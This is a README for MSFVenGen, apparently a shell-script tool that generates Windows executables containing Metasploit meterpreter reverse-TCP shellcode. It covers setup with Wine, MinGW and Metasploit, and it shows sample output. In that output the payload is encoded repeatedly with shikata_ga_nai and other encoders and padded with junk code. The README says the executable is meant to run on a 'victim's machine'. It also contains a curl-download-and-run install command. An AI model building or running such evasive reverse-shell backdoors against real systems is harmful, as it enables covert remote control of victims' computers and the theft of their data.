# MSFVenGen

MSFVenGen - Custom MSFVenom Executable Generator

### Requirements

- Linux
- Wine + MinGW
- Metasploit Framework

### Installing

##### Install Wine

Wine allows windows applications to be run on several platforms such as Linux, Mac OS X and more.

To install Wine just run this command:

    sudo apt-get install wine

##### Install MinGW

MinGW is a collection of windows development tools including compilers such as GCC and G++. Using both MiniGW and Wine it is possible to compile windows code thus creating a portable executable (pe) which can be later run on a victim's machine.

- Go to [SourceForge](http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download) to download the installer.
- In a terminal use `wine /path/to/file/mingw-get-setup.exe`
- Select "Run with GUI" option

Note that you must have the GUI up in order to get the installer to run properly. You can run it in a terminal however it draws a GUI box for installation.

- When the window appears, make sure to select mingw32-base. This is required to continue and make things work properly. Select Installation and click Update Catalogue.
- You want to get the right DLLs to be able to compile properly. You can find them here: [Go Jhonny!](http://gojhonny.com/misc/mingw_bin.zip)
- Unzip them into your Windows directory in wine. Its location should be `/home/USERNAME/.wine/drive_c/windows`

Great! Now you can use gcc.exe!

Syntax:

    cd /home/USERNAME/.wine/drive_c/MinGW/bin
    wine gcc.exe -o file.exe sourcefile.c

##### Metasploit Framework

The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development.

Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research.

The Metasploit Project is well known for its anti-forensic and evasion tools, some of which are built into the Metasploit Framework.

To install Metasploit Framework just run this command:

    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

### Usage

    ./msfvengen.sh

### Example output
    MSFVenGen - Custom MSFVenom Executable Generator
    
    LHOST?
    > 192.168.0.102
    LPORT?
    > 4444
    We will be using the windows/meterpreter/reverse_X payloads. Which would you like to use?
    > windows/meterpreter/reverse_tcp
    How many cycles we encode our shellcode?
    > 1
    Number of random seed to add some junk to the resulting C code source file:
    > 1
    
    Attempting to clean the ShellCode directory out...
    Attempting to generate shell-code...
    Attempting to read payload from STDIN...
    Attempting to read payload from STDIN...
    Attempting to read payload from STDIN...
    Attempting to read payload from STDIN...
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of generic/none
    generic/none succeeded with size 333 (iteration=0)
    generic/none chosen with final size 333
    Payload size: 333 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 360 (iteration=0)
    x86/shikata_ga_nai chosen with final size 360
    Payload size: 360 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/jmp_call_additive
    x86/jmp_call_additive succeeded with size 389 (iteration=0)
    x86/jmp_call_additive chosen with final size 389
    Payload size: 389 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/call4_dword_xor
    x86/call4_dword_xor succeeded with size 416 (iteration=0)
    x86/call4_dword_xor chosen with final size 416
    Payload size: 416 bytes
    
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 443 (iteration=0)
    x86/shikata_ga_nai chosen with final size 443
    Payload size: 443 bytes
    Final size of c file: 1886 bytes
    Saved as: /home/lonalore/msfvengen/ShellCode/test.c
    Shellcode generated.
    Cleaning it up...
    Creating Headers...
    Creating the first bit of fluff
    Creating the execution bit...
    Creating the last bit of fluff...
    Merging the last of it together...
    tcp-4444-826.exe SHA-1 Checksum is .. 088a3b485993622d450b534cead0ff5aa1701524 tcp-4444-826.exe
    
    Done!
